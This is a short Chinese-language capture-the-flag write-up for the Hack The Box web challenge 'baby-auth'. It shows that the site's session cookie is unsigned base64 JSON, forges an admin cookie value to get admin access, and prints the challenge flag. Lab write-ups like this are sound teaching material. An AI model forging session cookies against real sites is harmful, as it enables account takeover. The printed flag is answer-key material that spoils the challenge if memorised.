---
title: HTB-baby-auth
date: 2025-04-02 13:17:38
categories: 
  - CTF
  - Web
tags: [Web,HTB,Cookie]
excerpt: ""
---


## **题目描述**

![image-20250330122645983](https://raw.githubusercontent.com/archer-baiyi/Picture/main/image-20250330122645983.png)

（无附件）

## **观察**

打开网站：

![image-20250330122727122](https://raw.githubusercontent.com/archer-baiyi/Picture/main/image-20250330122727122.png)

注册个账号然后登录试试：

![image-20250330122748728](https://raw.githubusercontent.com/archer-baiyi/Picture/main/image-20250330122748728.png)

![image-20250330122803142](https://raw.githubusercontent.com/archer-baiyi/Picture/main/image-20250330122803142.png)

查看当前cookie：

![image-20250330122836415](https://raw.githubusercontent.com/archer-baiyi/Picture/main/image-20250330122836415.png)

这段内容base64解码可以得到：

```
eyJ1c2VybmFtZSI6IjEyMyJ9

{"username":"123"}
```



## 渗透

将cookie改成

```
{"username":"admin"}
```

的base64，即

```
eyJ1c2VybmFtZSI6ImFkbWluIn0=
```

修改cookie然后刷新网页：

![image-20250330123006122](https://raw.githubusercontent.com/archer-baiyi/Picture/main/image-20250330123006122.png)

![image-20250330123042635](https://raw.githubusercontent.com/archer-baiyi/Picture/main/image-20250330123042635.png)

得到flag：`HTB{s3ss10n_1nt3grity_1s_0v3r4tt3d_4nyw4ys}`。



